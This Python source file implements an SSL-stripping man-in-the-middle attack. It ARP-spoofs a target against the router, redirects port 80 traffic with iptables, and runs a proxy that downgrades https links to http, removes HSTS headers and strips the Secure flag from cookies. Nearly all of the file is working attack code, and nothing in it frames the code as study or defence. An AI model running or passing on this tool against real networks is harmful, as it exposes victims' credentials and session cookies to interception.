from scapy.all import *
from arp import *
from helper import *
import traceback
import re
import socket
from BaseHTTPServer import *
import threading
import os
import sys

class sslstrip:
    def __init__(self, target_ip, interface):
        self.target_ip = target_ip
        self.interface = interface
        self.redirect_port = 8080
        
    def set_iptables(self, toRunning):
        if toRunning:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            run_iptables_command("iptables -t nat -I PREROUTING 1 -p tcp --dport 80 -j REDIRECT --to-port %s" % self.redirect_port)
        else:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            run_iptables_command("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port %s" % self.redirect_port)

    class HTTPStrippingProxy(BaseHTTPRequestHandler):
        def do_GET(self):
            print("Received GET")
            self.handle_request()
            
        def do_POST(self):
            print("Received POST")
            self.handle_request()
            
        def handle_request(self):
            try:
                # Get the host header to get the destination
                host_header = self.headers.get('Host')
                if not host_header:
                    self.send_error(400, "Bad Request: Host header missing")
                
                #Get host and port
                splitted_host = host_header.split(':')
                host = splitted_host[0]
                port = 80 if len(splitted_host) == 1 else int(splitted_host[1])
                
                # connect to server
                skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                skt.connect((host, port))
                
                print("Opened socket with '%s:%s'" % (host, port))
                
                # creafe request
                self.headers['accept-Encoding'] = ''
                headers = "\r\n".join("%s: %s" % (key, value) for key, value in self.headers.items())
                request = "%s %s %s\r\n%s\r\n\r\n" % (self.command, self.path, self.request_version, headers)
                
                if self.command == 'POST':
                    length = int(self.headers.get('Content-Length', 0))
                    data = self.rfile.read(length)
                    request += data
                
                print("--------------------------\nRequest: \n%s\n-----------------------------------" % request)
                
                
                # send request
                skt.sendall(request)
                print("Send request")
                # receive response
                response = ""
                i = 0
                
                while True:
                    i += 1
                    chunk = skt.recv(4096)
                    print("\n.......................\nchunk %d: '%s'\n.............................." % (i, chunk))
                    if not chunk:
                        break
                    response += chunk
                
                skt.close()
                
                print("+++++++++++++++++++++++++\nResponse: \n%s\n+++++++++++++++++++++++++" % response)
                
                # Process response and return to victim
                self.wfile.write(self.process_response(response))
                
                
                
            except Exception as e:
                print("Error handling request: %s" % e)
                self.send_error(500, "internal error: %s" % e)                
                
                
        def process_response(self, response):
            lines = response.split('\r\n')
            status = lines[0]
                
            for i, line in enumerate(lines):
                if line == '':
                    end_of_header = i
                    break
            if not end_of_header:
                return response
                    
            headers = lines[1:end_of_header]
            body = '\r\n'.join(lines[end_of_header + 1:])
                
            modified_headers = []
                
            for header in headers:
                modified_headers.append(self.modify_header(header))
                
            modified_body = self.modify_body(body)
                
            return status + '\r\n' + '\r\n'.join(modified_headers) + '\r\n\r\n' + modified_body
            
                
        def modify_header(self, header):
            if header.lower().startswith('location: https://'):
                return header.lower().replace('https://', 'http://')
            elif header.lower().startswith('strict-transport-security:'):
                return None
            elif header.lower().startswith('set-cookie:'):
                return re.sub(r';\s*secure', '', header, flags=re.IGNORECASE)
            else:
                return header
            
        def modify_body(self, body):
            return re.sub(r'https://', 'http://', body, flags=re.IGNORECASE)
            
            
    def start_http_proxy(self):
        try:
            print("Starting HTTP strippgin proxy on port %s" % self.redirect_port)
            self.http_server = HTTPServer(("", self.redirect_port), self.HTTPStrippingProxy)
            self.http_server.serve_forever()
        except Exception as e:
            print("Could not start proxy: %s" % e)
            self.stop_http_proxy()
                
    def strip(self):
        try: 
            # Get router ip and start the arp spoof 
            conf.route.resync()
            router_ip = conf.route.route("0.0.0.0")[2]
            arp1 = arp()
            thread = threading.Thread(target=arp1.two_way_arp_spoof, args=(self.target_ip, router_ip, 2, self.interface))
            thread.start()
            
            self.set_iptables(True)
            self.start_http_proxy()
            
        except KeyboardInterrupt:
            print("Stopping ssl stripping attack")
            if self.http_server:
                self.http_server.shutdown()
            self.set_iptables(False)
            arp1.stop_spoof()
            thread.join()
        except Exception as e:
            print("An error occured")
            traceback.print_exc()
            self.set_iptables(False)
            
        
                    
                
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
                    
